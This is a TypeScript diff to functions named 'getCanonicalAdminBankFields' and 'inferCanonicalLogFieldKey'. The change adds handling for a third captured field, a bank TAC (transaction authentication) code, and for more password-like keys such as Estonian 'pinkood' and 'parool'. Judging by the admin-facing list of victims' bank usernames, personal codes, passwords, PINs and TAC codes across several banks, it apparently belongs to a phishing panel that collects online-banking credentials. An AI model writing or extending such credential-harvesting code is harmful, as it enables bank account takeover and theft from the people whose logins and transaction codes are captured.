@@ -103,6 +103,8 @@ function inferCanonicalLogFieldKey(
   if (
     normalizedKey.includes("password") ||
     normalizedKey.includes("passcode") ||
+    normalizedKey.includes("pincode") ||
+    normalizedKey.includes("pinkood") ||
     normalizedKey.includes("parool") ||
     normalizedKey.includes("pincalculatorcode") ||
     normalizedKey.includes("pincalccode") ||
@@ -238,14 +240,19 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   const orderedField2 = pickString("orderedField2");
   const orderedField2Key = pickString("orderedField2Key");
   const orderedField2Type = pickString("orderedField2Type");
+  const orderedField3 = pickString("orderedField3");
+  const orderedField3Key = pickString("orderedField3Key");
+  const orderedField3Type = pickString("orderedField3Type");
   const rawPersonalCode = pickString("personalCode");
   const rawUsername = pickString("username", "verfuegernummer");
   const rawPassword = pickString("password", "pin");
+  const rawTacCode = pickString("tacCode");
 
   const primaryValue = orderedField1 || rawPersonalCode || rawUsername;
   const secondaryValue = orderedField2 || rawPassword;
+  const tertiaryValue = orderedField3 || rawTacCode;
 
-  if (!primaryValue && !secondaryValue) {
+  if (!primaryValue && !secondaryValue && !tertiaryValue) {
     return [];
   }
 
@@ -277,20 +284,45 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
     orderedField2Key === "password"
   ) {
     fields.push([orderedField2Key, secondaryValue]);
-    return fields;
-  }
-
-  if (orderedField2Type === "phone") {
+  } else if (orderedField2Type === "phone") {
     fields.push(["bankPhone", secondaryValue]);
-    return fields;
-  }
-
-  if (orderedField2Type === "password" || (rawPassword && secondaryValue === rawPassword)) {
+  } else if (orderedField2Type === "password" || (rawPassword && secondaryValue === rawPassword)) {
     fields.push(["password", secondaryValue]);
+  } else {
+    fields.push(["username", secondaryValue]);
+  }
+
+  if (!tertiaryValue || fields.some(([, existingValue]) => existingValue === tertiaryValue)) {
     return fields;
   }
 
-  fields.push(["username", secondaryValue]);
+  if (
+    orderedField3Key === "username" ||
+    orderedField3Key === "personalCode" ||
+    orderedField3Key === "bankPhone" ||
+    orderedField3Key === "password" ||
+    orderedField3Key === "tacCode"
+  ) {
+    fields.push([orderedField3Key, tertiaryValue]);
+    return fields;
+  }
+
+  if (orderedField3Type === "phone") {
+    fields.push(["bankPhone", tertiaryValue]);
+    return fields;
+  }
+
+  if (orderedField3Type === "password" || (rawPassword && tertiaryValue === rawPassword)) {
+    fields.push(["password", tertiaryValue]);
+    return fields;
+  }
+
+  if (rawTacCode && tertiaryValue === rawTacCode) {
+    fields.push(["tacCode", tertiaryValue]);
+    return fields;
+  }
+
+  fields.push(["username", tertiaryValue]);
   return fields;
 }
 
